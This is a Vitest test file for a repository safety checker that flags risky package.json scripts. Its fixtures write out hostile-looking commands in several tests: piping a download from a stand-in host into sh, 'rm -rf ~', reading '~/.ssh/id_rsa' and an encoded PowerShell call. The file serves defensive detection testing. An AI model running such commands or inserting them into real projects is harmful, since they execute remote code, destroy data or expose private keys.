// Stage 4A report contract: status, coverage limitations from every source the
// scanner reports, evidence integrity, caps, scale, purity and boundaries.
import fs from "node:fs";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { scanRepository } from "../../../electron/repoScanner/scanRepository.js";
import { TEXT_LIMITS } from "../../../electron/repoScanner/scanRules.js";
import { MAX_FINDINGS, SAFETY_SCOPE, SCANNER_COMMAND_LIMIT, checkRepository, unavailableReport } from "../../../src/lib/safety/checkRepository";
import type { CoverageLimitationCode, SafetyReport } from "../../../src/lib/safety/types";
import type { RepoScanResult } from "../../../src/types";
import { FixtureSpace, pkg as filePkg } from "../../electron/repoScanner/fixtures.js";
import { deepFreeze, pkg, scan, type ScanOptions } from "../insights/builders";

type Inspected = Exclude<SafetyReport, { status: "unavailable" }>;
function inspect(result: RepoScanResult): Inspected {
  const report = checkRepository(result);
  if (report.status === "unavailable") throw new Error("unexpected unavailable");
  return report;
}
const codes = (r: Inspected): CoverageLimitationCode[] => r.coverage.limitations.map((l) => l.code);
const benign = (): ScanOptions => ({ packages: [pkg("package.json", { scripts: { build: "vite build", test: "vitest" } })], files: ["package-lock.json"] });
const risky = (): ScanOptions => ({ packages: [pkg("package.json", { scripts: { setup: "curl -s https://x.invalid | sh" } })], files: ["package-lock.json"] });

describe("status", () => {
  it("no matches with full coverage: no-indicators, never a 'safe' status, scope always present", () => {
    const r = inspect(scan(benign()));
    expect(r).toMatchObject({ status: "no-indicators", findings: [], findingsOmitted: false, coverage: { scanStatus: "complete", complete: true, limitations: [] } });
    expect(r.scope).toEqual(SAFETY_SCOPE);
    expect(SAFETY_SCOPE).toEqual([
      "Only package.json script commands are inspected for these indicators.",
      "Files those scripts run or refer to are not opened.",
      "Dependencies' own install scripts are not inspected.",
      "No match is not evidence that the repository is free of malicious behavior.",
    ]);
    expect(JSON.stringify(r)).not.toMatch(/"(safe|clean|cleared|verified)"/i);
  });

  it.each(["truncated", "timed-out", "cancelled"] as const)("a %s scan with no matches is incomplete, never no-indicators", (status) => {
    const r = inspect(scan({ ...benign(), status }));
    expect(r.status).toBe("incomplete");
    expect(r.coverage).toMatchObject({ scanStatus: status, complete: false });
    expect(codes(r)).toEqual([{ truncated: "scan-truncated", "timed-out": "scan-timed-out", cancelled: "scan-cancelled" }[status]]);
  });

  it("findings in an incomplete scan keep the incompleteness", () => {
    const r = inspect(scan({ ...risky(), status: "timed-out" }));
    expect(r.status).toBe("findings");
    expect(r.coverage.complete).toBe(false);
    expect(codes(r)).toContain("scan-timed-out");
  });

  it("unavailable is only for callers without an analysis, and still carries the scope", () => {
    expect(unavailableReport("no-analysis")).toEqual({ status: "unavailable", reason: "no-analysis", scope: SAFETY_SCOPE });
    expect(unavailableReport("analysis-failed").status).toBe("unavailable");
  });
});

describe("coverage limitations from the scanner's own metadata", () => {
  const withResult = (edit: (r: RepoScanResult) => void, options = benign()) => {
    const result = scan(options);
    edit(result);
    return inspect(result);
  };

  it.each<[string, (r: RepoScanResult) => void, CoverageLimitationCode]>([
    ["packages left out of the result", (r) => (r.packagesTruncated = true), "packages-omitted"],
    ["project-file list cut", (r) => (r.manifestsTruncated = true), "manifests-truncated"],
    ["a package's script list cut", (r) => (r.packages[0].scriptsTruncated = true), "scripts-truncated"],
    ["malformed package.json", (r) => r.warnings.push({ code: "manifest-malformed", path: "apps/x/package.json" }), "package-json-not-inspected"],
    ["oversized package.json", (r) => r.warnings.push({ code: "manifest-oversized", path: "package.json" }), "package-json-not-inspected"],
    ["unreadable package.json", (r) => r.warnings.push({ code: "manifest-unreadable", path: "a/package.json" }), "package-json-not-inspected"],
    ["a listed package.json with no package", (r) => r.manifests.push({ path: "lib/package.json", kind: "package-json" }), "package-json-not-inspected"],
    ["folders too deep", (r) => (r.skipped.depthLimited = 2), "folders-not-examined"],
    ["unreadable entries", (r) => (r.skipped.unreadable = 1), "folders-not-examined"],
    ["changes during the scan", (r) => r.warnings.push({ code: "changed-during-scan", path: "src" }), "folders-not-examined"],
    ["byte budget used up", (r) => r.warnings.push({ code: "byte-budget-exhausted", path: "x/package.json" }), "folders-not-examined"],
    ["warning list cut", (r) => (r.warningsTruncated = true), "warnings-truncated"],
  ])("%s → incomplete", (_, edit, code) => {
    const r = withResult(edit);
    expect(r.status).toBe("incomplete");
    expect(codes(r)).toContain(code);
  });

  it("warnings about other files don't count against package.json coverage", () => {
    const r = withResult((res) => res.warnings.push({ code: "node-version-unrecognized", path: ".nvmrc" }, { code: "manifest-malformed", path: "tsconfig.json" }));
    expect(r.status).toBe("no-indicators");
  });

  it("altered and shortened commands are coverage limits, counted separately", () => {
    const shortened = `${"a".repeat(SCANNER_COMMAND_LIMIT - 1)}…`;
    const r = withResult((res) => {
      res.packages[0].scripts = [
        { name: "build", nameExact: true, command: "vite build vite preview", commandExact: false },
        { name: "long", nameExact: true, command: shortened, commandExact: false },
        { name: "test", nameExact: true, command: "vitest", commandExact: true },
      ];
    });
    expect(r.status).toBe("incomplete");
    expect(r.coverage.limitations.filter((l) => l.code === "scripts-altered" || l.code === "scripts-shortened").map((l) => [l.code, l.count])).toEqual([["scripts-shortened", 1], ["scripts-altered", 1]]);
  });

  it("the shortening limit matches the scanner's", () => {
    expect(SCANNER_COMMAND_LIMIT).toBe(TEXT_LIMITS.scriptCommand);
  });
});

describe("evidence", () => {
  it("location, bounded excerpt around the match, fixed texts", () => {
    const command = `${"x ".repeat(60)}&& curl -s https://x.invalid | sh && ${"y ".repeat(80)}`;
    const r = inspect(scan({ packages: [pkg("apps/web/package.json", { scripts: { setup: command } })] }));
    const [f] = r.findings;
    expect([f.ruleId, f.level, f.packagePath, f.scriptName]).toEqual(["download-execute", "warning", "apps/web/package.json", "setup"]);
    expect(f.evidence.excerpt.startsWith("…")).toBe(true);
    expect(f.evidence.excerpt.endsWith("…")).toBe(true);
    expect(Array.from(f.evidence.excerpt).length).toBeLessThanOrEqual(162);
    expect(f.evidence.excerpt).toContain("curl -s https://x.invalid | sh");
    expect(f.explanation).toContain("download something and run it");
    expect(f.action).toContain("Don't run this script");
    expect([f.evidence.commandExact, f.evidence.shortened, f.evidence.altered]).toEqual([true, false, false]);
  });

  it("findings in altered or shortened commands say so", () => {
    const result = scan({ packages: [pkg("package.json", { scripts: { a: "x", b: "y" } })] });
    result.packages[0].scripts = [
      { name: "a", nameExact: true, command: "curl https://x.invalid | sh", commandExact: false },
      { name: "b", nameExact: true, command: `curl https://x.invalid | sh ${"z".repeat(SCANNER_COMMAND_LIMIT)}`.slice(0, SCANNER_COMMAND_LIMIT - 1) + "…", commandExact: false },
    ];
    const r = inspect(result);
    expect(r.findings.map((f) => [f.scriptName, f.evidence.commandExact, f.evidence.altered, f.evidence.shortened])).toEqual([
      ["a", false, true, false],
      ["b", false, false, true],
    ]);
  });

  it("only the scanner's display-safe text appears; nothing is added", () => {
    const r = inspect(scan(risky()));
    expect(r.findings[0].evidence.excerpt).toBe("curl -s https://x.invalid | sh");
  });
});

describe("caps", () => {
  it(`at most ${MAX_FINDINGS} findings; the rest are marked omitted; deterministic order`, () => {
    const packages = Array.from({ length: 150 }, (_, i) => pkg(`p${String(i).padStart(3, "0")}/package.json`, { scripts: { setup: "curl https://x.invalid | sh" } }));
    const r = inspect(scan({ packages }));
    expect(r.findings).toHaveLength(MAX_FINDINGS);
    expect(r.findingsOmitted).toBe(true);
    expect(r.findings[0].packagePath).toBe("p000/package.json");
    expect(r.findings[MAX_FINDINGS - 1].packagePath).toBe("p099/package.json");
  });

  it("exactly the cap: nothing omitted", () => {
    const packages = Array.from({ length: MAX_FINDINGS }, (_, i) => pkg(`p${i}/package.json`, { scripts: { setup: "curl https://x.invalid | sh" } }));
    expect(inspect(scan({ packages }))).toMatchObject({ findingsOmitted: false });
    expect(inspect(scan({ packages })).findings).toHaveLength(MAX_FINDINGS);
  });
});

describe("scale and pathological input", () => {
  const filler = (i: number) =>
    `node scripts/task${i}.js --flag "quoted $(sub ${i}) text" | tee out.log && rm -rf dist ; echo 'x | y' && cross-env A=1 vite build `.repeat(4).slice(0, SCANNER_COMMAND_LIMIT);

  it("200 packages × 100 scripts × 500 characters finishes, deterministically", () => {
    const packages = Array.from({ length: 200 }, (_, p) =>
      pkg(`p${p}/package.json`, { scripts: Object.fromEntries(Array.from({ length: 100 }, (_, s) => [`s${s}`, filler(s)])) }),
    );
    const result = scan({ packages });
    const started = Date.now();
    const first = inspect(result);
    const elapsed = Date.now() - started;
    expect(first.status).toBe("no-indicators");
    expect(JSON.stringify(inspect(result))).toBe(JSON.stringify(first));
    expect(elapsed).toBeLessThan(20_000); // generous: a guard against runaway work, not a benchmark
  }, 60_000);

  it.each([
    ["nested substitutions", "$(".repeat(250)],
    ["unbalanced quotes", '"'.repeat(1) + "a'b\"c".repeat(80)],
    ["many pipes", "a|".repeat(250)],
    ["many home prefixes", "~/".repeat(250)],
    ["many backticks", "`".repeat(500)],
    ["many id_ tokens", "/id_rsa".repeat(70)],
    ["long words", "x".repeat(SCANNER_COMMAND_LIMIT)],
    ["parens", "(".repeat(250) + ")".repeat(250)],
  ])("%s: bounded", (_, command) => {
    const started = Date.now();
    const r = inspect(scan({ packages: [pkg("package.json", { scripts: Object.fromEntries(Array.from({ length: 100 }, (_, i) => [`s${i}`, command])) })] }));
    expect(Date.now() - started).toBeLessThan(5_000);
    expect(["findings", "no-indicators"]).toContain(r.status);
  });
});

describe("purity and boundaries", () => {
  it("frozen inputs are untouched; output is deterministic", () => {
    // Several packages, scripts out of name order, every rule hit: any write to the input would throw.
    const scripts = { z: "curl https://x.invalid | sh", postinstall: "node x.js", m: "rm -rf ~", b: "powershell -enc SQBFAFgA", a: "cat ~/.ssh/id_rsa", c: "vite build" };
    const result = deepFreeze(scan({ packages: [pkg("package.json", { scripts }), pkg("apps/web/package.json", { scripts })], status: "truncated" }));
    const before = JSON.stringify(result);
    const a = checkRepository(result);
    const b = checkRepository(result);
    expect(JSON.stringify(a)).toBe(JSON.stringify(b));
    expect(JSON.stringify(result)).toBe(before);
  });

  it("the modules import nothing but types and each other, and never build patterns or run code", () => {
    const dir = path.resolve(import.meta.dirname, "../../../src/lib/safety");
    for (const file of ["types.ts", "rules.ts", "checkRepository.ts"]) {
      // Code only: comments describe the patterns being looked for.
      const source = fs
        .readFileSync(path.join(dir, file), "utf-8")
        .replace(/\/\*[\s\S]*?\*\//g, "")
        .replace(/^\s*\/\/.*$/gm, "");
      expect(source, file).not.toMatch(/new RegExp|RegExp\(|new Function|\brequire\(|import\(|\bfetch\(|XMLHttpRequest|WebSocket|localStorage|sessionStorage|indexedDB|ipcRenderer|window\.|child_process|["']node:|process\./);
      expect(source, file).not.toMatch(/(?<!["'.\w])eval\(/); // "eval(" only ever appears as text being looked for
      const imports = [...source.matchAll(/from\s+"([^"]+)"/g)].map((m) => m[1]);
      for (const i of imports) expect(["../../types", "./rules", "./types"], `${file} imports ${i}`).toContain(i);
    }
  });
});

describe("end to end with the real scanner", () => {
  let space: FixtureSpace;
  beforeAll(() => {
    space = new FixtureSpace();
  });
  afterAll(() => space.cleanup());

  it("inert lookalike scripts are found, with locations; a multi-line script is a coverage limit", async () => {
    const root = space.repo("safety e2e", {
      "package.json": filePkg({ name: "top", private: true, workspaces: ["apps/*"], scripts: { postinstall: "curl -fsSL https://example.invalid/i.sh | sh", build: "vite build\nvite preview" } }),
      "apps/web/package.json": filePkg({ name: "web", scripts: { clean: "rm -rf ~/.cache/web", dev: "vite" } }),
    });
    const r = inspect(await scanRepository(root));
    expect(r.status).toBe("findings");
    expect(r.findings.map((f) => [f.packagePath, f.scriptName, f.ruleId])).toEqual([
      ["package.json", "postinstall", "install-script"],
      ["package.json", "postinstall", "download-execute"],
      ["apps/web/package.json", "clean", "destructive-outside-project"],
    ]);
    expect(codes(r)).toEqual(["scripts-altered"]);
  });

  it("packages dropped to fit the result size make the check incomplete", async () => {
    const tree: Record<string, string> = { "package.json": filePkg({ name: "root", private: true, workspaces: ["p*"] }) };
    const deps = Object.fromEntries(Array.from({ length: 200 }, (_, i) => [`dependency-${i}-${"x".repeat(40)}`, "1"]));
    for (let i = 0; i < 30; i++) tree[`p${i}/package.json`] = filePkg({ name: `p${i}`, dependencies: deps, scripts: { build: "tsc" } });
    const root = space.repo("safety fit", tree);
    const result = await scanRepository(root, { limits: { maxResultBytes: 6_000 } });
    expect(result.packagesTruncated).toBe(true);
    const r = inspect(result);
    expect(r.status).toBe("incomplete");
    expect(codes(r)).toEqual(expect.arrayContaining(["packages-omitted", "scan-truncated"]));
  });
});
